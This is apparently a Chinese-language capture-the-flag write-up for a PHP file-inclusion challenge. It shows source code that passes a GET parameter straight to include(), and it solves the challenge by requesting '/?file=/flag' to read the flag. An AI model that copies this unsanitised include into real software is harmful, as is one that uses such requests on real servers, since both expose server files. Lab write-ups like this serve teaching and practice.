**启动靶机，访问目标地址：**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012172350773.png)

```php
`<?php   /**    * Created by PhpStorm.    * User: jinzhao    * Date: 2019/7/9    * Time: 7:07 AM    */      highlight_file(__FILE__);      
if(isset($_GET['file'])) {    
	$str = $_GET['file'];          
	include $_GET['file'];   
}`
```
**添加`/?file=/flag`得到 flag{1ddcf09f-bcae-414c-a0ca-c42e9ae13bd1}**

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251012172642037.png)
